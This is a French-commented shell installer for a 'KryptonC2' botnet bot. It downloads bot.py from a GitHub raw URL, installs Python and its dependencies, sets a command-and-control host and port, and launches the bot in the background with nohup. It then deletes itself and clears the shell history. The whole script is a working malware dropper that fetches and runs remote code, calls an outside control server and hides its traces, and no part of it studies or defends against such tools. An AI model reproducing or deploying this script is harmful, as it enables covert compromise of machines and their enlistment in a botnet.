#!/bin/sh
# Script d'installation du bot KryptonC2
# À héberger sur un serveur web accessible

# Configuration du serveur C2
C2_ADDRESS="nlzpsjlvr.localto.net"
C2_PORT="7274"

# Télécharger le bot
cd /tmp || cd /var/tmp || cd / || cd /root || cd /home || cd /mnt || cd /opt || cd /usr || cd /bin || cd /sbin || cd /dev || cd /sys || cd /proc || cd /run || cd /var || cd /srv || cd /boot || cd /lib || cd /lib64 || cd /etc || cd /root

# Télécharger le bot Python
wget -q https://raw.githubusercontent.com/emb123-1/cwxcxvxc/refs/heads/main/bot.py -O bot.py || curl -s https://raw.githubusercontent.com/emb123-1/cwxcxvxc/refs/heads/main/bot.py -o bot.py

# Si Python n'est pas disponible, essayer d'installer ou utiliser busybox python
if ! command -v python3 >/dev/null 2>&1; then
    if command -v python >/dev/null 2>&1; then
        PYTHON_CMD="python"
    elif command -v busybox >/dev/null 2>&1; then
        PYTHON_CMD="busybox python"
    else
        # Essayer d'installer Python (selon la distribution)
        opkg update && opkg install python3 2>/dev/null || apt-get update && apt-get install -y python3 2>/dev/null || yum install -y python3 2>/dev/null || apk add python3 2>/dev/null
        PYTHON_CMD="python3"
    fi
else
    PYTHON_CMD="python3"
fi

# Modifier l'adresse du serveur C2 dans le bot
sed -i "s/KRYPTONC2_ADDRESS.*=.*\".*\"/KRYPTONC2_ADDRESS  = \"$C2_ADDRESS\"/" bot.py 2>/dev/null || \
sed -i "s/KRYPTONC2_ADDRESS.*=.*'.*'/KRYPTONC2_ADDRESS  = \"$C2_ADDRESS\"/" bot.py 2>/dev/null

sed -i "s/KRYPTONC2_PORT.*=.*[0-9]*/KRYPTONC2_PORT  = $C2_PORT/" bot.py 2>/dev/null

# Rendre exécutable
chmod +x bot.py

# Installer les dépendances de base (si possible)
$PYTHON_CMD -m pip install socket threading time random cloudscraper requests struct os sys socks ssl 2>/dev/null || \
pip install socket threading time random cloudscraper requests struct os sys socks ssl 2>/dev/null || \
opkg install python3-pip && pip3 install cloudscraper requests pysocks 2>/dev/null || true

# Lancer le bot en arrière-plan
nohup $PYTHON_CMD bot.py > /dev/null 2>&1 &

# Nettoyer
rm -f bot.py install_bot.sh
history -c

